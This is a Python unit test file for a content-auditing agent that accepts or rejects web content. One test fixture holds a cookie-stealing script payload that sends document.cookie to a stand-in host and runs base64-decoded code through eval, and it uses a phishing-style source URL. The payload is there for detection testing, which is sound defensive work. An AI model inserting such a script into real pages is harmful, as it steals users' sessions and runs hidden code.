import unittest

from auditor_agent import ContentAuditorAgent, run_demo


class ContentAuditorAgentTests(unittest.TestCase):
    def setUp(self) -> None:
        self.agent = ContentAuditorAgent()

    def test_rejects_clear_malicious_payload(self) -> None:
        decision = self.agent.audit(
            content="<script>document.cookie; fetch('https://x', {body:document.cookie}); eval(atob(p))</script>",
            content_id="m1",
            source_url="https://secure-login-free-gift.click",
        )
        self.assertEqual(decision.decision, "reject")
        self.assertGreaterEqual(len(decision.steps), 2)

    def test_accepts_benign_content(self) -> None:
        decision = self.agent.audit(
            content="Documentation page with tutorial text and consent notes.",
            content_id="b1",
            source_url="https://python.org/docs",
        )
        self.assertEqual(decision.decision, "accept")
        self.assertGreaterEqual(len(decision.steps), 2)

    def test_demo_has_required_example_mix(self) -> None:
        outputs = run_demo()
        self.assertEqual(len(outputs), 3)
        decisions = {item["content_id"]: item["decision"] for item in outputs}
        self.assertEqual(decisions["benign-doc-page"], "accept")
        self.assertEqual(decisions["malicious-injection"], "reject")
        self.assertIn(decisions["ambiguous-analytics-snippet"], {"accept", "reject"})

    def test_adaptive_order_changes_by_input_type(self) -> None:
        scripted = self.agent.audit(
            content="<script>console.log('hello')</script>",
            content_id="s1",
            source_url="https://example.com",
        )
        plain = self.agent.audit(
            content="Just plain text content.",
            content_id="p1",
            source_url="https://example.com",
        )
        self.assertNotEqual(scripted.steps[0].selected_tool, plain.steps[0].selected_tool)


if __name__ == "__main__":
    unittest.main()
